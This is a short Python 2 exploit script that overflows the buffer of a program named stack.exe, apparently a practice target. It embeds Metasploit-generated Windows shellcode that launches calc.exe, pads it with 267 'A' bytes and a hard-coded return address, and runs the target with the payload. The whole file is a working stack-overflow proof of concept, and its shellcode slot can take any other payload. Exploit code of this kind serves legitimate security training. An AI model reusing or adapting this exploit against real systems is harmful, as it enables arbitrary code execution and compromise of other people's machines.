import struct 
import os
#
#  windows/exec - 121 bytes
#  http://www.metasploit.com
#  EXITFUNC=seh, CMD=calc.exe
# 

shellcode  = "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef"
shellcode += "\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31"
shellcode += "\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b"
shellcode += "\x54\x24\x04\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
shellcode += "\x5f\x1c\x01\xeb\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x5f"
shellcode += "\x31\xf6\x60\x56\x64\x8b\x46\x30\x8b\x40\x0c\x8b\x70\x1c\xad"
shellcode += "\x8b\x68\x08\x89\xf8\x83\xc0\x6a\x50\x68\xf0\x8a\x04\x5f\x68"
shellcode += "\x98\xfe\x8a\x0e\x57\xff\xe7\x63\x61\x6c\x63\x2e\x65\x78\x65"
shellcode += "\x00"
payload = '\x41'*267 + struct.pack('<L', 0x7c951eed) 
size= len(payload)
print payload
print "Payload Length" 
print size
os.system('stack.exe ' + '"'+payload+'"')
